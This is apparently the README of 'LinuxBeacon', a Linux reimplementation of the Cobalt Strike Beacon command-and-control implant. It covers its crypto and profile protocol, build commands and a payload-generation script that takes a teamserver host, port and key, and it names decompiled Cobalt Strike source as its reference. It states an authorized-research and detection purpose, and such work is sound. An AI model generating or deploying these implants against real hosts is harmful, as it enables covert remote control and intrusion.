# LinuxBeacon

Linux-native Cobalt Strike Beacon reimplementation aligned with the official
Windows Beacon protocol surface (`CobaltStrikeBeaconCppSource-main`).

## Goals

- Official settings blob (`myargs` TLV, XOR `0x2E`)
- Official crypto: RSA-PKCS1 metadata, AES-128-CBC + truncated HMAC-SHA256
- Official Malleable bytecode VM (`profile.cpp` opcodes)
- HTTP/S first; DNS / TCP pivot / ExtC2 in later phases
- CLI + Aggressor payload generation (jar bridge for settings)

## Phases

See [docs/PHASES.md](docs/PHASES.md).

## Build (implant)

```bash
cd implant
make            # bin/beacon
make debug      # -DDEBUG
```

Dependencies: `gcc`, `libssl-dev`, `libcurl4-openssl-dev`.

### Malleable VM (P2)

Runtime interprets `SETTING_C2_REQUEST` / `C2_POSTREQ` / `C2_RECOVER` bytecode
(same opcodes as official `profile.cpp`). HTTP GET/POST no longer hardcode Cookie
or `?id=`; those come from the settings programs (default blob already embeds
Cookie metadata + `id` parameter + print output).

Offline unit test on a Linux host with OpenSSL:

```bash
gcc -I implant/headers tests/test_profile_vm.c \
  implant/src/profile.c implant/src/encoders.c implant/src/parse.c \
  -lssl -lcrypto -o tests/test_profile_vm
./tests/test_profile_vm
```

## Generate payload

```bash
# 0) Once: build jar bridge (needs 4.5/lib/cobaltstrike.jar + JDK)
bash tools/bridge/build.sh

# 1) Export teamserver public key → tools/fixtures/publickey.der

# 2–4) Pack settings + insert + make (jar = custom profile; python = default only)
bash tools/gen_payload.sh --host IP --port PORT --https 0|1 \
  --pubkey tools/fixtures/publickey.der \
  --bridge jar --profile /path/to.profile \
  --out Beacon_x64
```

Python fallback (default Cookie/`?id=` programs only):

```bash
bash tools/gen_payload.sh --host IP --port PORT --bridge python --out beacon
```

Aggressor UI: load `CustomBeacon.cna` (set `$LinuxBeaconRoot`). See [docs/UI_GENERATE.md](docs/UI_GENERATE.md).

## Layout

```
implant/     runtime (C)
tools/       settings packer (CS4.5-compatible), jar bridge, Aggressor helpers
docs/        protocol + phases + SOURCE_MAP_4.5 (Java/C++ crosswalk)
tests/       frame-level unit tests
```

## Protocol truth sources

| Tree | Use |
|------|-----|
| `../4.5/decompiled_src/` | CS 4.5 Java: Settings, BeaconPayload, c2profile.Program |
| `../CobaltStrikeBeaconCppSource-main/` | Windows Beacon C++ runtime (security, profile, proto) |

Generate Windows beacons with the same teamserver you use to test LinuxBeacon;
diff settings blobs to validate `tools/pack_settings.py`.

## Compliance

Authorized research, detection engineering, and lab use only. Does not bundle
Cobalt Strike jars. You must supply your own licensed/research CS artifacts.
